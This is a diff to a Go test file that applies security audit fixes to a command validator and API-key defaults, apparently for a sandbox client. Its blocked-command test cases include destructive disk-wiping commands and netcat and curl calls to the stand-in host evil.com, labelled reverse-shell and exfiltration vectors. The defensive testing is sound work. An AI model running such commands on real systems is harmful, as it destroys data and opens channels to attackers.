@@ -115,7 +115,9 @@ func TestValidateGitURLWhitespace(t *testing.T) {
 }
 
 func TestValidateCommand(t *testing.T) {
-	valid := []string{"ls -la", "echo hello", "python app.py", "cat /etc/hostname", "whoami", "pwd"}
+	// AUDIT FIX C-01: python removed from default allowlist.
+	// It can be added via CUBE_EXEC_ALLOWLIST if needed.
+	valid := []string{"ls -la", "echo hello", "cat /etc/hostname", "whoami", "pwd", "git status"}
 	for _, cmd := range valid {
 		if _, err := validateCommand(cmd); err != nil {
 			t.Errorf("expected '%s' to be valid: %v", cmd, err)
@@ -127,6 +129,12 @@ func TestValidateCommand(t *testing.T) {
 		"mkfs.ext4 /dev/sda",
 		"dd if=/dev/zero of=/dev/sda",
 		"chmod 777 /etc",
+		// AUDIT FIX C-01: these are now blocked by default
+		"python app.py",       // interpreters removed from allowlist
+		"bash -c whoami",      // shells removed from allowlist
+		"sh -c 'ls'",          // shells removed from allowlist
+		"nc evil.com 4444",    // netcat removed (reverse shell vector)
+		"curl http://evil.com", // curl removed (exfiltration vector)
 	}
 	for _, cmd := range invalid {
 		if _, err := validateCommand(cmd); err == nil {
@@ -198,8 +206,10 @@ func TestNewCubeClientDefaults(t *testing.T) {
 	if c.BaseURL != "http://localhost:3000" {
 		t.Errorf("expected default URL, got %s", c.BaseURL)
 	}
-	if c.APIKey != "e2b_000000" {
-		t.Errorf("expected default key, got %s", c.APIKey)
+	// AUDIT FIX H-06: No hardcoded default key. Without CUBE_API_KEY the client
+	// uses a non-functional anonymous token and logs a warning.
+	if c.APIKey != "cube-anonymous" {
+		t.Errorf("expected anonymous fallback, got %s", c.APIKey)
 	}
 }
 
